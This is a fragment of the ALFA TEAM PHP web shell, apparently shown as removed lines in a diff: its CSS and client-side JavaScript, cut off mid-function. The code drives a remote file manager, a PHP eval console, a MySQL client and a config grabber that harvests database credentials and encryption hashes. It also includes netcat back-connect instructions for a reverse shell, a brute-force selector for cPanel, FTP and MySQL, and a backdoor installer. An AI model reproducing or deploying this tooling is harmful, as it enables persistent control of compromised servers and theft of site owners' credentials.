10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div:hover{background-color:#a23939}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #0e304a}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#alfa-copyright{margin-top:15px}.ic_b_plus{background-image:url(http://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(http://solevisible.com/icons/menu/b_minus.png)}
-<?php echo '
-@keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
-@-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
-@-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
-@-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
-#alfaloader{'.$csscode.'width:100px;height:100px;}
-#a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
-.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
-.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
-</style>';
-echo "<script type='text/javascript'>
-var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
-var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
-var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
-var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
-var post_encryption_mode = ".(__ALFA_POST_ENCRYPTION__?'true':'false').";";?>
-var alfa1_="",alfa2_="",alfa3_="",alfa4_="",alfa5_="",alfa6_="",alfa7_="",alfa8_="",alfa9_="",alfa10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,alfa_can_add_opt=!1,alfa_before_do_action_id="",alfa_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_ALFA_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],alfa_current_fm_id=1,alfa_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.alfa1.value=null!=t?t:"",d.mf.alfa2.value=null!=i?i:"",d.mf.alfa3.value=null!=l?l:"",d.mf.alfa4.value=null!=o?o:"",d.mf.alfa5.value=null!=r?r:"",d.mf.alfa6.value=null!=n?n:"",d.mf.alfa7.value=null!=s?s:"",d.mf.alfa8.value=null!=c?c:"",d.mf.alfa9.value=null!=f?f:"",d.mf.alfa10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=alfa_current_fm_id,t="a="+alfab64("FilesMan")+"&c="+alfab64(e.c.value)+"&alfa1="+alfab64(e.alfa1.value)+"&ajax="+alfab64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+alfab64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.alfa1.value)return!1;switch(alfaloader("filesman_holder_"+a,"block"),e.alfa1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){alfaloader("filesman_holder_"+a,"none"),alfaFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",alfaInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_ALFA_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),alfaClearAjax(l)):4==o.readyState&&200!=o.status&&(alfaAjaxError(o.status,l,o.statusText,o.responseText),alfaClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function alfaClearAjax(e){_ALFA_AJAX_.hasOwnProperty(e)&&delete _ALFA_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=alfa_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",alfab64(e.a.value)),l.append("c",alfab64(e.c.value)),l.append("alfa1",alfab64(e.alfa1.value)),l.append("charset",alfab64(e.charset.value)),l.append("ajax",alfab64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_ALFA_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":alfaAjaxError(a.status,"upload_area",a.statusText,a.responseText),alfaClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),alfaShowNotification("File(s) uploaded successfully","Uploader"),alfaFmngrContextRow()}else alfaShowNotification("Folder has no permission...","Uploader","error");alfaCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function alfaCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){var fm_id=0==alfa_fm_id?alfa_current_fm_id:alfa_fm_id,fm_id2=alfa_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=alfa_before_do_action_id;0==alfa_fm_id&&(set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=alfa2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(alfaloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?alfaloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=alfa2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),alfaloader(g_action_id,"block"));for(var data="a="+alfab64(a)+"&c="+alfab64(d_mf_c)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+alfab64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){alfaLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d_mf_c),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(alfaLoaderOnTop("none"),"sql"==a)return loadPopUpDatabase(e,t),!1;if("FilesMan"==a){alfaloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=alfaGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,alfaFmngrContextRow(),"function"==typeof alfa1&&alfa1(e),alfaCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||alfaloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&alfaLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&alfaColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(alfaloader(alfa3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}alfaloader(t,"none")},!1,alfa3))}function alfaGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function alfaloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="alfaAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="alfateam-loader-text">ALFA TEAM</div><div class="alfa-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),alfaloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("query")+"&alfa2=&c="+alfab64(c_)+"&charset="+alfab64("UTF-8")+"&type="+alfab64(n)+"&sql_host="+alfab64(i)+"&sql_login="+alfab64(l)+"&sql_pass="+alfab64(o)+"&sql_base="+alfab64(r)+"&sql_count="+alfab64(s)+"&current_mysql_id="+alfab64(a)+"&ajax="+alfab64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),alfaloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function alfa_searcher_tool(e){switch(e){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function alfaAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".alfa-ajax-error").innerHTML=e+" ( "+t+firewall+" )",alfaShowNotification(t,"Ajax","error"))}}function alfaInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){alfaFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;alfaSortMenuItems(["newtab"]),alfaRightClickMenu(i,l),e.preventDefault()})})}function alfaRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function alfaSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function alfaAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=alfa_ace_editors.editor;"eval"==i&&(l=alfa_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("alfa_ace_"+a+"_"+i,t,2012)}function alfaAceChangeWrapMode(e,a){var t=alfa_ace_editors.editor;"eval"==a&&(t=alfa_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function alfaAceChangeFontSize(e,a,t){var i=alfa_ace_editors.editor;"eval"==e&&(i=alfa_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("alfa_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=alfa_ace_editors.editor&&null!=alfa_ace_editors.editor){for(var a in alfa_ace_editors.editor)alfa_ace_editors.editor[a].destroy();alfa_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=alfa_ace_editors.eval){for(var a in alfa_ace_editors.eval)alfa_ace_editors.eval[a].destroy();alfa_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function 